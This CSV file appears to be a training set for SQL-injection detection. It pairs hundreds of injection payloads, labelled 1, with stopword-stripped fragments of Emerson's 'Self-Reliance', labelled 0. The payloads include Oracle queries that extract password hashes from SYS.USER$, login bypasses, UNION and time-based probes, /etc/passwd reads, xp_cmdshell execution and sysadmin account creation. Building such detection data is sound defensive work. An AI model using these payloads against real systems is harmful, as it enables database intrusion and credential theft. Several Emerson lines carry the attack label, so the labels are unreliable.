Sentence,Label
"' AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( column_name )  FROM  ( SELECT DISTINCT ( column_name ) , ROWNUM AS LIMIT FROM all_tab_columns )  WHERE LIMIT = 1  )  )   AND 'i' = 'i",1
"' AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( granted_role )  FROM  ( SELECT DISTINCT ( granted_role ) , ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE = SYS.LOGINUSER )  WHERE LIMIT = 1  )  )   AND 'i' = 'i",1
"' AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( USERNAME )  FROM  ( SELECT DISTINCT ( USERNAME ) , ROWNUM AS LIMIT FROM SYS.ALL_USERS )  WHERE LIMIT = 2  )  )   AND 'i' = 'i",1
"' AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( PASSWORD )  FROM  ( SELECT DISTINCT ( PASSWORD ) , ROWNUM AS LIMIT FROM SYS.USER$ )  WHERE LIMIT = 2  )  )   AND 'i' = 'i",1
"' AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( table_name )  FROM  ( SELECT DISTINCT ( table_name ) , ROWNUM AS LIMIT FROM sys.all_tables )  WHERE LIMIT = 2  )  )   AND 'i' = 'i",1
"' AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( column_name )  FROM  ( SELECT DISTINCT ( column_name ) , ROWNUM AS LIMIT FROM all_tab_columns )  WHERE LIMIT = 2  )  )   AND 'i' = 'i",1
"' AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( granted_role )  FROM  ( SELECT DISTINCT ( granted_role ) , ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE = SYS.LOGINUSER )  WHERE LIMIT = 2  )  )   AND 'i' = 'i",1
"' AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( USERNAME )  FROM  ( SELECT DISTINCT ( USERNAME ) , ROWNUM AS LIMIT FROM SYS.ALL_USERS )  WHERE LIMIT = 3  )  )   AND 'i' = 'i",1
"' AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( PASSWORD )  FROM  ( SELECT DISTINCT ( PASSWORD ) , ROWNUM AS LIMIT FROM SYS.USER$ )  WHERE LIMIT = 3  )  )   AND 'i' = 'i",1
"' AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( table_name )  FROM  ( SELECT DISTINCT ( table_name ) , ROWNUM AS LIMIT FROM sys.all_tables )  WHERE LIMIT = 3  )  )   AND 'i' = 'i",1
"' AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( column_name )  FROM  ( SELECT DISTINCT ( column_name ) , ROWNUM AS LIMIT FROM all_tab_columns )  WHERE LIMIT = 3  )  )   AND 'i' = 'i",1
" It may safely trusted proportionate good issues, faithfully imparted, God work made manifest cowards",0
" A man relieved gay put heart work done best; said done otherwise, shall give peace",0
 It deliverance deliver,0
" In attempt genius deserts him; muse befriends; invention, hope",0
 Trust thyself: every heart vibrates iron string,0
" Accept place divine providence found you, society contemporaries, connection events",0
" Great men always done so, confided childlike genius age, betraying perception absolutely trustworthy seated heart, working hands, predominating being",0
" And men, must accept highest mind transcendent destiny; minors invalids protected corner, cowards fleeing revolution, guides, redeemers, benefactors, obeying Almighty effort, advancing Chaos Dark",0
" What pretty oracles nature yields us text, face behaviour children, babes, even brutes! That divided rebel mind, distrust sentiment arithmetic computed strength means opposed purpose, not",0
" Their mind whole, eye yet unconquered, look faces, disconcerted",0
" Infancy conforms nobody: conform it, one babe commonly makes four five adults prattle play it",0
" So God armed youth puberty manhood less piquancy charm, made enviable gracious claims put by, stand itself",0
" Do think youth force, cannot speak me",0
 Hark! next room voice sufficiently clear emphatic,0
"' AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( column_name )  FROM  ( SELECT DISTINCT ( column_name ) , ROWNUM AS LIMIT FROM all_tab_columns )  WHERE LIMIT = 6  )  )   AND 'i' = 'i",1
"' AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( granted_role )  FROM  ( SELECT DISTINCT ( granted_role ) , ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE = SYS.LOGINUSER )  WHERE LIMIT = 6  )  )   AND 'i' = 'i",1
"' AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( USERNAME )  FROM  ( SELECT DISTINCT ( USERNAME ) , ROWNUM AS LIMIT FROM SYS.ALL_USERS )  WHERE LIMIT = 7  )  )   AND 'i' = 'i",1
"' AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( PASSWORD )  FROM  ( SELECT DISTINCT ( PASSWORD ) , ROWNUM AS LIMIT FROM SYS.USER$ )  WHERE LIMIT = 7  )  )   AND 'i' = 'i",1
"' AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( table_name )  FROM  ( SELECT DISTINCT ( table_name ) , ROWNUM AS LIMIT FROM sys.all_tables )  WHERE LIMIT = 7  )  )   AND 'i' = 'i",1
"' AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( column_name )  FROM  ( SELECT DISTINCT ( column_name ) , ROWNUM AS LIMIT FROM all_tab_columns )  WHERE LIMIT = 7  )  )   AND 'i' = 'i",1
"' AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( granted_role )  FROM  ( SELECT DISTINCT ( granted_role ) , ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE = SYS.LOGINUSER )  WHERE LIMIT = 7  )  )   AND 'i' = 'i",1
"' AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( USERNAME )  FROM  ( SELECT DISTINCT ( USERNAME ) , ROWNUM AS LIMIT FROM SYS.ALL_USERS )  WHERE LIMIT = 8  )  )   AND 'i' = 'i",1
' or 1 = 1--,1
"' AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( table_name )  FROM  ( SELECT DISTINCT ( table_name ) , ROWNUM AS LIMIT FROM sys.all_tables )  WHERE LIMIT = 8  )  )   AND 'i' = 'i",1
"' AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( column_name )  FROM  ( SELECT DISTINCT ( column_name ) , ROWNUM AS LIMIT FROM all_tab_columns )  WHERE LIMIT = 8  )  )   AND 'i' = 'i",1
"' AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( granted_role )  FROM  ( SELECT DISTINCT ( granted_role ) , ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE = SYS.LOGINUSER )  WHERE LIMIT = 8  )  )   AND 'i' = 'i",1
( ||6 ),1
||6,1
'||'6,1
"select * from users where id = 1 or ""; ) "" = 1 or 1 = 1 -- 1",1
"select * from users where id = 1 or "";,"" = 1 or 1 = 1 -- 1",1
or 1 = 1,1
' or '1' = '1,1
; or '1' = '1',1
""" or isNULL ( 1/0 )  /*",1
' or '7659' = '7659,1
""" or isNULL ( 1/0 )  /*",1
' -- ,1
' or 1 = 1--,1
""" or 1 = 1--",1
' or 1 = 1 /*,1
or 1 = 1--,1
' or 'a' = 'a,1
""" or ""a"" = ""a",1
' )  or  ( 'a' = 'a,1
admin' or ',1
' select * from information_schema.tables--,1
 )  union select * from information_schema.tables;,1
' having 1 = 1--,1
' having 1 = 1--,1
' group by userid having 1 = 1--,1
' select name from syscolumns where id  =   ( select id from sysobjects where name  =  tablename' ) --,1
' or 1 in  ( select @@version ) --,1
' union all select @@version--,1
' or 'unusual'  =  'unusual',1
' or 'something'  =  'some'+'thing',1
' or 'text'  =  n'text',1
' or 'something' like 'some%',1
' or 2 > 1,1
' or 'text' > 't',1
' or 'whatever' in  ( 'whatever' ) ,1
' or 2 between 1 and 3,1
' or username like char ( 37 ) ;,1
"' union select * from users where login  =  char ( 114,111,111,116 ) ;",1
' union select ,1
password:*/ = 1--,1
uni/**/on sel/**/ect,1
'; execute immediate 'sel' || 'ect us' || 'er',1
'; exec  ( 'sel' + 'ect us' + 'er' ) ,1
'/**/or/**/1/**/ = /**/1,1
' or 1/*,1
or isNULL ( 1/0 )  /*,1
' or '7659' = '7659,1
""" or isNULL ( 1/0 )  /*",1
' -- &password = ,1
'; begin declare @var varchar ( 8000 )  set @var = ':' select @var = @var+'+login+'/'+password+' ' from users where login >,1
@var select @var as var into temp end --,1
' and 1 in  ( select var from temp ) --,1
"' union select 1,load_file ( '/etc/passwd' ) ,1,1,1;",1
"1; ( load_file ( char ( 47,101,116,99,47,112,97,115,115,119,100  )  )   ) ,1,1,1;",1
"' and 1 =  (  if  (  (  load_file ( char ( 110,46,101,120,116  )  )  <>char ( 39,39  )  )  ,1,0  )  )  ;",1
'; exec master..xp_cmdshell 'ping 10.10.1.2'--,1
create user name identified by 'pass123',1
create user name identified by pass123 temporary tablespace temp default tablespace users;,1
' ; drop table temp --,1
"exec sp_addlogin 'name' , 'password'",1
"exec sp_addsrvrolemember 'name' , 'sysadmin'",1
"insert into mysql.user  ( user, host, password )  values  ( 'name', 'localhost', password ( 'pass123'  )  )",1
grant connect to name; grant resource to name;,1
"insert into users ( login, password, level )  values (  char ( 0x70 )  + char ( 0x65 )  + char ( 0x74 )  + char ( 0x65 )  + char ( 0x72 )  + char ( 0x70 )  + char ( 0x65 )  + char ( 0x74 )  + char ( 0x65 )  + char ( 0x72 ) ,char ( 0x64 )",1
' or 1 = 1 --,1
' union  ( select @@version )  --,1
"' union  ( select NULL,  ( select @@version  )  )   --",1
"' union  ( select NULL, NULL,  ( select @@version  )  )   --",1
"' union  ( select NULL, NULL, NULL,   ( select @@version  )  )   --",1
"' union  ( select NULL, NULL, NULL, NULL,   ( select @@version  )  )   --",1
"' union  ( select NULL, NULL, NULL, NULL,  NULL,  ( select @@version  )  )   --",1
"'; if not ( substring  (  (  select @@version ) ,25,1 )  <> 0 )  waitfor delay '0:0:2' --",1
"'; if not ( substring  (  (  select @@version ) ,25,1 )  <> 5 )  waitfor delay '0:0:2' --",1
"'; if not ( substring  (  (  select @@version ) ,25,1 )  <> 8 )  waitfor delay '0:0:2' --",1
"'; if not ( substring  (  (  select @@version ) ,24,1 )  <> 1 )  waitfor delay '0:0:2' --",1
'; if not ( select system_user )  <> 'sa' waitfor delay '0:0:2' --,1
'; if is_srvrolemember ( 'sysadmin' )  > 0 waitfor delay '0:0:2' --,1
'; if not  (  (  select serverproperty ( 'isintegratedsecurityonly'  )  )   <> 1 )  waitfor delay '0:0:2' --,1
'; if not  (  (  select serverproperty ( 'isintegratedsecurityonly'  )  )   <> 0 )  waitfor delay '0:0:2' --,1
"select * from users where id = 1 or  ( \ )  = 1 union select 1,@@VERSION -- 1",1
"select * from users where id = 1 or  ( \. )  = 1 union select 1,@@VERSION -- 1",1
select * from users where id = 1 or  ( \+ )  = 1 or 1 = 1 -- 1,1
"select * from users where id = 1 or  ( 1 )  = 1 union select 1,banner from v$version where rownum = 1 -- 1",1
"select * from users where id = 1 or  ( \+ )  = 1 union select 1,@@VERSION -- 1",1
select * from users where id = 1 or  ( $+ )  = 1 or 1 = 1 -- 1,1
"select * from users where id = 1 or  ( $+ )  = 1 union select 1,@@VERSION -- 1",1
select * from users where id = 1 or \.<\ or 1 = 1 -- 1,1
select * from users where id = 1 or \.<1 or 1 = 1 -- 1,1
"select * from users where id = 1 or \.<1 union select 1,@@VERSION -- 1",1
"select * from users where id = 1 or \.<\ union select 1,@@VERSION -- 1",1
select * from users where id = 1 or \.<$ or 1 = 1 -- 1,1
"select * from users where id = 1 or \.<$ union select 1,@@VERSION -- 1",1
"select * from users where id = 1 or \.<  = 1 union select 1,@@VERSION -- 1",1
"select * from users where id = 1 ||1 union select 1,banner from v$version where rownum = 1 -- 1",1
"select * from users where id = 1 ||1 union select null,banner from v$version where rownum = 1 -- 1",1
select * from users where id = 1   or 1 = 1 -- 1,1
select * from users where id = 1 or \+<\ or 1 = 1 -- 1,1
"select * from users where id = 1 or  1<@ = 1 union select 1,version (  )  -- 1",1
"select * from users where id = 1 or \+<\ union select 1,@@VERSION -- 1",1
"select * from users where id = 1 or \+<$ union select 1,@@VERSION -- 1",1
"select * from users where id = 1 or 1&@# = 1 union select 1,version (  )  -- 1",1
"select * from users where id = 1 or $ . = 1 union select 1,@@VERSION -- 1",1
select * from users where id = 1 or $ 1 = 1 or 1 = 1 -- 1,1
"select * from users where id = 1 or $ 1 = 1 union select 1,@@VERSION -- 1",1
select * from users where id = 1 or $<\ or 1 = 1 -- 1,1
select * from users where id = 1 or $<\. or 1 = 1 -- 1,1
"select * from users where id = 1 or $<\. union select 1,@@VERSION -- 1",1
"select * from users where id = 1 or $<\ union select 1,@@VERSION -- 1",1
select * from users where id = 1 or $+<\ or 1 = 1 -- 1,1
"select * from users where id = 1 or $+<1 union select 1,@@VERSION -- 1",1
"select * from users where id = 1 or $+<\ union select 1,@@VERSION -- 1",1
"select * from users where id = 1 or $+<$ union select 1,@@VERSION -- 1",1
select * from users where id = 1 or \<\. or 1 = 1 -- 1,1
"select * from users where id = 1 or \<\. union select 1,@@VERSION -- 1",1
select * from users where id = 1 or \<1 or 1 = 1 -- 1,1
"select * from users where id = 1 or \<1 union select 1,@@VERSION -- 1",1
"select * from users where id = 1 or \<\ union select 1,@@VERSION -- 1",1
"select * from users where id = 1 or \<\ union select null,@@VERSION -- 1",1
select * from users where id = 1 or \<$ or 1 = 1 -- 1,1
"select * from users where id = 1 or \<$ union select 1,@@VERSION -- 1",1
select * from users where id = 1 or \<  = 1 or 1 = 1 -- 1,1
" I hope somewhat better whim last, cannot spend day explanation",0
 Expect show cause I seek I exclude company,0
" Then, again, tell me, good man to-day, obligation put poor men good situations",0
" Are poor? I tell thee, thou foolish philanthropist, I grudge dollar, dime, cent, I give men belong I belong",0
" There class persons spiritual affinity I bought sold; I go prison, need be; miscellaneous popular charities; education college fools; building meeting-houses vain end many stand; alms sots; thousandfold Relief Societies; — though I confess shame I sometimes succumb give dollar, wicked dollar I shall manhood withhold",0
" Virtues are, popular estimate, rather exception rule",0
 There man virtues,0
"select * from users where id = 1 + ( \ )  union select null,@@VERSION -- 1",1
"select * from users where id = 1.&&1 union select 1,version (  )  -- 1",1
select * from users where id = 1. or 1 = 1 -- 1,1
"select * from users where id = 1.&&@ union select 1,version (  )  -- 1",1
select * from users where id = 1 +  ( \. )  or 1 = 1 -- 1,1
"select * from users where id = 1 +  ( \. )  union select null,@@VERSION -- 1",1
"select * from users where id = 1.  union select 1,version (  )  -- 1",1
"select * from users where id = 1. union select 1,banner from v$version where rownum = 1 -- 1",1
"select * from users where id = 1.  union select version (  ) ,version (  )  -- 1",1
"select * from users where id = 1. union select null,version (  )  -- 1",1
"select * from users where id = 1 +\. union select null,@@VERSION -- 1",1
"select * from users where id = 1. union select null,banner from v$version where rownum = 1 -- 1",1
select * from users where id = 1. <@ or 1 = 1 -- 1,1
select * from users where id = 1.<@. or 1 = 1 -- 1,1
"select * from users where id = 1.<@. union select 1,version (  )  -- 1",1
select * from users where id = 1.*1 or 1 = 1 -- 1,1
"select * from users where id = 1.*1 union select 1,banner from v$version where rownum = 1 -- 1",1
"select * from users where id = 1.<1# union select 1,version (  )  -- 1",1
"select * from users where id = 1. <@ union select 1,version (  )  -- 1",1
"select * from users where id = 1. <@ union select version (  ) ,version (  )  -- 1",1
"select * from users where id = 1.*\ union select null,@@VERSION -- 1",1
select * from users where id = 1.<@$ or 1 = 1 -- 1,1
"select * from users where id = 1.<@$ union select 1,version (  )  -- 1",1
select * from users where id = 1.%@ or 1 = 1 -- 1,1
"select * from users where id = 1.%@ union select 1,version (  )  -- 1",1
"select * from users where id = 11||1 union select 1,banner from v$version where rownum = 1 -- 1",1
" It harder, always find think know duty better know it",0
 It easy world live world’s opinion; easy solitude live own; great man midst crowd keeps perfect sweetness independence solitude,0
" The objection conforming usages become dead is, scatters force",0
 It loses time blurs impression character,0
" If maintain dead church, contribute dead Bible-society, vote great party either government it, spread table like base housekeepers, — screens I difficulty detect precise man are",0
" And, course, much force withdrawn proper life",0
"select * from users where id = 11<1# union select 1,version (  )  -- 1",1
select * from users where id = 1 +  ( \+ )  or 1 = 1 -- 1,1
"select * from users where id = 1 +  ( \+ )  union select null,@@VERSION -- 1",1
"select * from users where id = 1 +\+. union select null,@@VERSION -- 1",1
"select * from users where id = 1 -1<@ union select 1,version (  )  -- 1",1
"select * from users where id = 1 +1<@ union select version (  ) ,version (  )  -- 1",1
"select * from users where id = 1 +1<@ union select null,version (  )  -- 1",1
select * from users where id = 1 + \+%\ or 1 = 1 -- 1,1
select * from users where id = 1 + \+%1 or 1 = 1 -- 1,1
"select * from users where id = 1 + \+%1 union select null,@@VERSION -- 1",1
"select * from users where id = 1 + \+*\ union select null,@@VERSION -- 1",1
select * from users where id = 1 + \+%$ or 1 = 1 -- 1,1
"select * from users where id = 1 + \+*$ union select null,@@VERSION -- 1",1
"select * from users where id = 1 union select  ( 1 ) ,banner from v$version where rownum = 1 -- 1",1
" We come wear one cut face figure, acquire degrees gentlest asinine expression",1
" There mortifying experience particular, fail wreak also general history; I mean foolish face praise, forced smile put company feel ease answer conversation interest us",1
" The muscles, spontaneously moved, moved low usurping wilfulness, grow tight outline face disagreeable sensation",1
"select * from users where id = 1 union select 1 $,version (  )  -- 1",1
" Else, to-morrow stranger say masterly good sense precisely thought felt time, shall forced take shame opinion another",0
" There time every man’s education arrives conviction envy ignorance; imitation suicide; must take better, worse, portion; though wide universe full good, kernel nourishing corn come toil bestowed plot ground given till",0
" The power resides new nature, none knows do, know tried",0
"select * from users where id = 1 union select .1_,version (  )  -- 1",1
"select * from users where id = 1 union select 1`\`,version (  )  -- 1",1
"select * from users where id = 1 union select 1a#,banner from v$version where rownum = 1 -- 1",1
"select * from users where id = 1 union select 1a,banner from v$version where rownum = 1 -- 1",1
 I suppose man violate nature,0
" All sallies rounded law being, inequalities Andes Himmaleh insignificant curve sphere",0
 Nor matter gauge try him,0
" A character like acrostic Alexandrian stanza; — read forward, backward, across, still spells thing",0
" In pleasing, contrite wood-life God allows me, let record day day honest thought without prospect retrospect, and, I cannot doubt, found symmetrical, though I mean not, see not",0
 My book smell pines resound hum insects,0
 The swallow window interweave thread straw carries bill web also,0
 We pass are,0
 Character teaches wills,0
"select * from users where id = 1 union select @&&@,version (  )  -- 1",1
"select * from users where id = 1 union select @ 1$,version (  )  -- 1",1
"select * from users where id = 1 union select  @ $,version (  )  -- 1",1
"select * from users where id = 1 union select @ 1a,version (  )  -- 1",1
"select * from users where id = 1 union select @<@$,version (  )  -- 1",1
"select * from users where id = 1   union select null,banner from v$version where rownum = 1 -- 1",1
"select * from users where id = 1 union select @ _,version (  )  -- 1",1
"select * from users where id = 1 union select @ $_,version (  )  -- 1",1
"select * from users where id = 1 union select @<@,version (  )  -- 1",1
"select * from users where id = 1 union select @<@.,version (  )  -- 1",1
"select * from users where id = 1 union select @ $$,version (  )  -- 1",1
" Leave theory, Joseph coat hand harlot, flee",0
" A foolish consistency hobgoblin little minds, adored little statesmen philosophers divines",0
 With consistency great soul simply nothing do,0
"select * from users where id = 1 +$ 1 union select null,@@VERSION -- 1",1
select * from users where id = 1 +$+ or 1 = 1 -- 1,1
select * from users where id = 1 +  ( $+ )  or 1 = 1 -- 1,1
  Add plain text Ne te quaesiveris extra,0
" Man star; soul Render honest perfect man, Commands light, influence, fate; Nothing falls early late",0
" Our acts angels are, good ill, Our fatal shadows walk us still",0
" Epilogue Beaumont Fletcher’s Honest Man’s Fortune Cast bantling rocks, Suckle she-wolf’s teat; Wintered hawk fox, Power speed hands feet",0
 I read day verses written eminent painter original conventional,0
" The soul always hears admonition lines, let subject may",0
 The sentiment instil value thought may contain,0
" To believe thought, believe true private heart true men, — genius",0
" Speak latent conviction, shall universal sense; inmost due time becomes outmost, — first thought rendered back us trumpets Last Judgment",0
" Familiar voice mind each, highest merit ascribe Moses, Plato, Milton is, set naught books traditions, spoke men thought",0
" A man learn detect watch gleam light flashes across mind within, lustre firmament bards sages",0
" Yet dismisses without notice thought, his",0
 In every work genius recognize rejected thoughts: come back us certain alienated majesty,0
 Great works art affecting lesson us this,0
 They teach us abide spontaneous impression good-humored inflexibility whole cry voices side,0
"select * from users where id = 1 union select 1||1,version (  )  -- 1",1
"select * from users where id = 1 union select 1||@,version (  )  -- 1",1
"select * from users where id = 1 union select 1 1$,version (  )  -- 1",1
" Not nothing one face, one character, one fact, makes much impression him, another none",0
 This sculpture memory without preestablished harmony,0
" The eye placed one ray fall, might testify particular ray",0
" We half express ourselves, ashamed divine idea us represents",0
"' AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( granted_role )  FROM  ( SELECT DISTINCT ( granted_role ) , ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE = SYS.LOGINUSER )  WHERE LIMIT = 3  )  )   AND 'i' = 'i",1
"' AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( USERNAME )  FROM  ( SELECT DISTINCT ( USERNAME ) , ROWNUM AS LIMIT FROM SYS.ALL_USERS )  WHERE LIMIT = 4  )  )   AND 'i' = 'i",1
"' AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( PASSWORD )  FROM  ( SELECT DISTINCT ( PASSWORD ) , ROWNUM AS LIMIT FROM SYS.USER$ )  WHERE LIMIT = 4  )  )   AND 'i' = 'i",1
"' AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( table_name )  FROM  ( SELECT DISTINCT ( table_name ) , ROWNUM AS LIMIT FROM sys.all_tables )  WHERE LIMIT = 4  )  )   AND 'i' = 'i",1
"' AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( column_name )  FROM  ( SELECT DISTINCT ( column_name ) , ROWNUM AS LIMIT FROM all_tab_columns )  WHERE LIMIT = 4  )  )   AND 'i' = 'i",1
"' AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( granted_role )  FROM  ( SELECT DISTINCT ( granted_role ) , ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE = SYS.LOGINUSER )  WHERE LIMIT = 4  )  )   AND 'i' = 'i",1
"' AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( USERNAME )  FROM  ( SELECT DISTINCT ( USERNAME ) , ROWNUM AS LIMIT FROM SYS.ALL_USERS )  WHERE LIMIT = 5  )  )   AND 'i' = 'i",1
"' AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( PASSWORD )  FROM  ( SELECT DISTINCT ( PASSWORD ) , ROWNUM AS LIMIT FROM SYS.USER$ )  WHERE LIMIT = 5  )  )   AND 'i' = 'i",1
"' AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( table_name )  FROM  ( SELECT DISTINCT ( table_name ) , ROWNUM AS LIMIT FROM sys.all_tables )  WHERE LIMIT = 5  )  )   AND 'i' = 'i",1
"' AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( column_name )  FROM  ( SELECT DISTINCT ( column_name ) , ROWNUM AS LIMIT FROM all_tab_columns )  WHERE LIMIT = 5  )  )   AND 'i' = 'i",1
"' AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( granted_role )  FROM  ( SELECT DISTINCT ( granted_role ) , ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE = SYS.LOGINUSER )  WHERE LIMIT = 5  )  )   AND 'i' = 'i",1
"' AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( USERNAME )  FROM  ( SELECT DISTINCT ( USERNAME ) , ROWNUM AS LIMIT FROM SYS.ALL_USERS )  WHERE LIMIT = 6  )  )   AND 'i' = 'i",1
"' AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( PASSWORD )  FROM  ( SELECT DISTINCT ( PASSWORD ) , ROWNUM AS LIMIT FROM SYS.USER$ )  WHERE LIMIT = 6  )  )   AND 'i' = 'i",1
"' AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( table_name )  FROM  ( SELECT DISTINCT ( table_name ) , ROWNUM AS LIMIT FROM sys.all_tables )  WHERE LIMIT = 6  )  )   AND 'i' = 'i",1
 It seems knows speak contemporaries,0
" Bashful bold, then, know make us seniors unnecessary",0
" The nonchalance boys sure dinner, would disdain much lord say aught conciliate one, healthy attitude human nature",0
" A boy parlour pit playhouse; independent, irresponsible, looking corner people facts pass by, tries sentences merits, swift, summary way boys, good, bad, interesting, silly, eloquent, troublesome",0
" He cumbers never consequences, interests: gives independent, genuine verdict",0
 You must court him: court you,0
" But man is, were, clapped jail consciousness",0
" As soon acted spoken eclat, committed person, watched sympathy hatred hundreds, whose affections must enter account",0
